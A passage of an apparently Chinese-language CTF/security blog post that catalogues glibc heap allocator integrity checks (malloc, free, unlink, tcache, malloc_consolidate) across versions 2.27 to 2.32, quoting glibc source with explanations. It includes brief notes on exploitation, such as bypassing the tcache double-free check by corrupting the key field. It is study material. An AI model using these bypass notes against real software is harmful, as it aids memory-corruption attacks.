    &#125;</span><br></pre></td></tr></table></figure><p>取出smallbin中的chunk时,判断链表的完整性</p><h4 id="munsortedbin-1"><a href="#munsortedbin-1" class="headerlink" title="munsortedbin-1"></a>munsortedbin-1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                   chunk2mem (victim), av);</span><br></pre></td></tr></table></figure><p>unsorted循环遍历时,检查从unsortedbin中取出的chunk的size是否合规</p><h4 id="munsorted-2"><a href="#munsorted-2" class="headerlink" title="munsorted-2"></a>munsorted-2</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>将unsortedbin中取出的chunk放入不为空的largebin中时,largebin链中的最后一个chunk的NON_MAIN_ARENA标志位应该为0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>将unsortedbin中取出的chunk放入不为空的largebin中时,chunk的size大于等于最小的size</p><p>会对每一个位于nextsize链上大于它的chunk调用检查</p><h4 id="mlargebin-1"><a href="#mlargebin-1" class="headerlink" title="mlargebin-1"></a>mlargebin-1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  bck = unsorted_chunks (av);</span><br><span class="line">               fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                 &#123;</span><br><span class="line">                   errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">                   <span class="keyword">goto</span> errout;</span><br><span class="line">                 &#125;</span><br></pre></td></tr></table></figure><p>largebin中取出chunk需要切割时,会检查unsorted头部的完整性</p><h4 id="mbinmap-1"><a href="#mbinmap-1" class="headerlink" title="mbinmap-1"></a>mbinmap-1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">               bck = unsorted_chunks (av);</span><br><span class="line">               fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                 &#123;</span><br><span class="line">                   errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;</span><br><span class="line">                   <span class="keyword">goto</span> errout;</span><br><span class="line">                 &#125;</span><br></pre></td></tr></table></figure><p>与<strong>largebin-1</strong>相同,位于binmap分配中</p><h2 id="free"><a href="#free" class="headerlink" title="free"></a>free</h2><h3 id="int-free"><a href="#int-free" class="headerlink" title="__int_free"></a>__int_free</h3><h4 id="fglobal-1"><a href="#fglobal-1" class="headerlink" title="fglobal-1"></a>fglobal-1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect ((<span class="type">uintptr_t</span>) p &gt; (<span class="type">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid pointer&quot;</span>;</span><br><span class="line">  errout:</span><br><span class="line">    <span class="keyword">if</span> (!have_lock &amp;&amp; locked)</span><br><span class="line">      (<span class="type">void</span>) mutex_unlock (&amp;av-&gt;mutex);</span><br><span class="line">    malloc_printerr (check_action, errstr, chunk2mem (p), av);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><ol><li>通过无符号数比较p是否大于-size,判断p是否正常</li><li>判断p是否对齐</li></ol><h4 id="fglobal-2"><a href="#fglobal-2" class="headerlink" title="fglobal-2"></a>fglobal-2</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid size&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>size是否小于MINSIZE或者size不对齐</p><h4 id="ffastbin-1"><a href="#ffastbin-1" class="headerlink" title="ffastbin-1"></a>ffastbin-1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">     &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>判断p的下一个chunk的size是否正常</p><h4 id="ffastbin-2"><a href="#ffastbin-2" class="headerlink" title="ffastbin-2"></a>ffastbin-2</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>如果p等于该fastbin链上的第一个chunk,那么判定为double free</p><h4 id="ffastbin-3"><a href="#ffastbin-3" class="headerlink" title="ffastbin-3"></a>ffastbin-3</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="number">0</span>))</span><br><span class="line">     &#123;</span><br><span class="line">errstr = <span class="string">&quot;invalid fastbin entry (free)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>比较少见的一个检查</p><h4 id="fglobal-2-1"><a href="#fglobal-2-1" class="headerlink" title="fglobal-2"></a>fglobal-2</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">     &#123;</span><br><span class="line">errstr = <span class="string">&quot;double free or corruption (top)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>如果p为top_chunk,判定为double free</p><h4 id="fglobal-3"><a href="#fglobal-3" class="headerlink" title="fglobal-3"></a>fglobal-3</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">  &amp;&amp; (<span class="type">char</span> *) nextchunk</span><br><span class="line">  &gt;= ((<span class="type">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">     &#123;</span><br><span class="line">errstr = <span class="string">&quot;double free or corruption (out)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>判断p的nextchunk是否超越了堆的边界</p><h4 id="fglobal-4"><a href="#fglobal-4" class="headerlink" title="fglobal-4"></a>fglobal-4</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">     &#123;</span><br><span class="line">errstr = <span class="string">&quot;double free or corruption (!prev)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>判断p的nextchunk的prev_inuse位是否为1,不为1则报错</p><h4 id="fglobal-5"><a href="#fglobal-5" class="headerlink" title="fglobal-5"></a>fglobal-5</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   nextsize = chunksize(nextchunk);</span><br><span class="line">   <span class="keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">     &#123;</span><br><span class="line">errstr = <span class="string">&quot;free(): invalid next size (normal)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>判断p的nextchunk的size是否正常</p><h4 id="fglobal-6"><a href="#fglobal-6" class="headerlink" title="fglobal-6"></a>fglobal-6</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">     <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">&#123;</span><br><span class="line">  errstr = <span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">  <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>放入unsortedbin时,判断unsorted的头部完整性</p><h2 id="附属"><a href="#附属" class="headerlink" title="附属"></a>附属</h2><h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><h4 id="unlink-1"><a href="#unlink-1" class="headerlink" title="unlink-1"></a><strong>unlink-1</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))      \</span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);</span><br></pre></td></tr></table></figure><p>验证完整性,操作chunk的上一个的下一个和下一个的上一个是否都等于该chunk</p><h4 id="unlink-2"><a href="#unlink-2" class="headerlink" title="unlink-2"></a>unlink-2</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)      \</span><br><span class="line">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">     malloc_printerr (check_action,      \</span><br><span class="line">       <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span><br><span class="line">       P, AV);</span><br></pre></td></tr></table></figure><p>和unlink-1类似,不过检查的是largebin的nextsize链完整性</p><h1 id="glibc2-27"><a href="#glibc2-27" class="headerlink" title="glibc2.27"></a>glibc2.27</h1><h2 id="附属-1"><a href="#附属-1" class="headerlink" title="附属"></a>附属</h2><h3 id="unlink-1"><a href="#unlink-1" class="headerlink" title="unlink"></a>unlink</h3><h4 id="unlink-3"><a href="#unlink-3" class="headerlink" title="+unlink-3"></a><strong>+unlink-3</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">  malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>); </span><br></pre></td></tr></table></figure><p>检查通过该chunk的size找到的nextchunk的prev_size是否等于该chunk的size,</p><p>unlink不会检查通过prev_size找到的chunk的size是否等于那个prev_size</p><h3 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate"></a>malloc_consolidate</h3><h4 id="maco-1"><a href="#maco-1" class="headerlink" title="+maco-1"></a>+maco-1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx = fastbin_index (chunksize (p));</span><br><span class="line">  <span class="keyword">if</span> ((&amp;fastbin (av, idx)) != fb)</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc_consolidate(): invalid chunk size&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断由p的size计算得出的fastbin索引是否与当前fastbin链匹配</p><h3 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h3><h4 id="tcput-1"><a href="#tcput-1" class="headerlink" title="+tcput-1"></a>+tcput-1</h4><p><code>assert (tc_idx &lt; TCACHE_MAX_BINS);</code></p><p>判断tc_idx是否越界</p><h4 id="tcget-1"><a href="#tcget-1" class="headerlink" title="+tcget-1"></a>+tcget-1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>判断tc_idx是否越界以及该tcache链是否为空</p><h1 id="glibc2-29"><a href="#glibc2-29" class="headerlink" title="glibc2.29"></a>glibc2.29</h1><h2 id="malloc-1"><a href="#malloc-1" class="headerlink" title="malloc"></a>malloc</h2><h3 id="munsortedbin-1-1"><a href="#munsortedbin-1-1" class="headerlink" title="@munsortedbin-1"></a>@munsortedbin-1</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &lt;= <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">    || __glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): invalid size (unsorted)&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">    || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): invalid next size (unsorted)&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)</span><br><span class="line">    || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): unsorted double linked list corrupted&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (prev_inuse (next)))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;</span>);</span><br></pre></td></tr></table></figure><p>除了之前就存在的对victim的size检查外,新增:</p><ol><li>对nextchunk(victim的物理相邻chunk)的size的检查</li><li>判断该chunk的size是否等于nextchunk的prev_size</li><li>判断链表尾部的完整性</li><li>对victim的nextchunk的prev_inuse位检查,是否合理</li></ol><h3 id="munsortedbin-2"><a href="#munsortedbin-2" class="headerlink" title="+munsortedbin-2"></a>+munsortedbin-2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">          malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);</span><br></pre></td></tr></table></figure><p>移除unsorted中chunk时检查链表尾是否完整</p><h3 id="usetop-1"><a href="#usetop-1" class="headerlink" title="+usetop-1"></a>+usetop-1</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted top size&quot;</span>);</span><br></pre></td></tr></table></figure><p>检查topchunk的size是否合规</p><h2 id="free-1"><a href="#free-1" class="headerlink" title="free"></a>free</h2><h3 id="ftcache-1"><a href="#ftcache-1" class="headerlink" title="+ftcache-1"></a>+ftcache-1</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">  &#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line"> tmp;</span><br><span class="line"> tmp = tmp-&gt;next)</span><br><span class="line">      <span class="keyword">if</span> (tmp == e)</span><br><span class="line">malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">    <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">       few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>free时,如果一个chunk的key字段等于tcache,那么就会遍历该tcache链中的所有chunk来判断是否存在double free</p><p><strong>可以通过破坏key绕过</strong></p><h3 id="fglobal-7"><a href="#fglobal-7" class="headerlink" title="+fglobal-7"></a>+fglobal-7</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之前向低地址合并都是不检查即将unlink的chunk的size是否等于找到这个chunk的prev_size</p><p>现在新增了这个检查,使得unlink的利用受到多一点的限制</p><p>向高地址合并则没有变化</p><p>且<strong>宏unlink</strong>现在由<strong>函数unlink_chunk</strong>实现</p><p>但内部具体代码并无明显变化</p><h2 id="附属-2"><a href="#附属-2" class="headerlink" title="附属"></a>附属</h2><h3 id="maco-2"><a href="#maco-2" class="headerlink" title="+maco-2"></a>+maco-2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size in fastbins&quot;</span>);</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与fglobal-7相同,只不过由malloc_consolidate触发</p><h1 id="glibc2-31"><a href="#glibc2-31" class="headerlink" title="glibc2.31"></a>glibc2.31</h1><h2 id="malloc-2"><a href="#malloc-2" class="headerlink" title="malloc"></a>malloc</h2><h3 id="munsortedbin-3"><a href="#munsortedbin-3" class="headerlink" title="+munsortedbin-3"></a>+munsortedbin-3</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br></pre></td></tr></table></figure><p>当unsortedbin中的chunk放入largebin时,如果要放入的size不小于largebin链中最小的chunk,且size异于largebin链上的所有chunk,则会在插入nextsize链时检测nextsize链完整性</p><h3 id="munsortedbin-4"><a href="#munsortedbin-4" class="headerlink" title="+munsortedbin-4"></a>+munsortedbin-4</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br></pre></td></tr></table></figure><p>当unsortedbin中的chunk放入largebin时,如果要放入的size不小于largebin链中最小的chunk,就会触发fd/bk链的完整性检查</p><p><strong>这两个检查实际上应该是2.30增加的</strong></p><h2 id="附属-3"><a href="#附属-3" class="headerlink" title="附属"></a>附属</h2><h3 id="tcput-1-1"><a href="#tcput-1-1" class="headerlink" title="-tcput-1"></a>-tcput-1</h3><p>tcache_put中去除</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br></pre></td></tr></table></figure><h3 id="tcget-1-1"><a href="#tcget-1-1" class="headerlink" title="-tcget-1"></a>-tcget-1</h3><p>tcache_get中去除</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>当然这并不意味着tcache-&gt;entries[tc_idx]== 0是可行的,因为这样的话__libc_malloc根本不会进入tcache_get</p><h1 id="glibc2-32"><a href="#glibc2-32" class="headerlink" title="glibc2.32"></a>glibc2.32</h1><h2 id="malloc-3"><a href="#malloc-3" class="headerlink" title="malloc"></a>malloc</h2><h3 id="mfastbin-2"><a href="#mfastbin-2" class="headerlink" title="+mfastbin-2"></a>+mfastbin-2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (misaligned_chunk (victim)))</span><br><span class="line">   malloc_printerr (<span class="string">&quot;malloc(): unaligned fastbin chunk detected 2&quot;</span>);</span><br></pre></td></tr></table></figure><p>fastbin取出chunk时,新增chunk对齐检查</p><h3 id="mfastbin-3"><a href="#mfastbin-3" class="headerlink" title="+mfastbin-3"></a>+mfastbin-3</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (pp != <span class="literal">NULL</span> &amp;&amp; misaligned_chunk (pp)))       \</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): unaligned fastbin chunk detected&quot;</span>); \</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在REMOVE_FB宏中,新增对齐检测</p><h3 id="mfastbin-4"><a href="#mfastbin-4" class="headerlink" title="+mfastbin-4"></a>+mfastbin-4</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (misaligned_chunk (tc_victim)))</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): unaligned fastbin chunk detected 3&quot;</span>);</span><br></pre></td></tr></table></figure><p>fastbin填充tcachebin新增对齐检测,会检查每一个chunk是否对齐</p><h2 id="free-2"><a href="#free-2" class="headerlink" title="free"></a>free</h2><h3 id="ftcache-1-1"><a href="#ftcache-1-1" class="headerlink" title="@ftcache-1"></a>@ftcache-1</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">  &#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line"> tmp;</span><br><span class="line"> tmp = REVEAL_PTR (tmp-&gt;next))</span><br><span class="line">      &#123;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (tmp)))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;free(): unaligned chunk detected in tcache 2&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (tmp == e)</span><br><span class="line">  malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line"><span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">   few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>判断doublefree时,会检查tcache链上的所有chunk是否对齐</p><h2 id="附属-4"><a href="#附属-4" class="headerlink" title="附属"></a>附属</h2><h3 id="maco-3"><a href="#maco-3" class="headerlink" title="+maco-3"></a>+maco-3</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (misaligned_chunk (p)))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc_consolidate(): &quot;</span></span><br><span class="line">     <span class="string">&quot;unaligned fastbin chunk detected&quot;</span>);</span><br></pre></td></tr></table></figure><p>每一个fastbin取出时会检查对齐</p><h3 id="tcget-2"><a href="#tcget-2" class="headerlink" title="+tcget-2"></a>+tcget-2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): unaligned tcache chunk 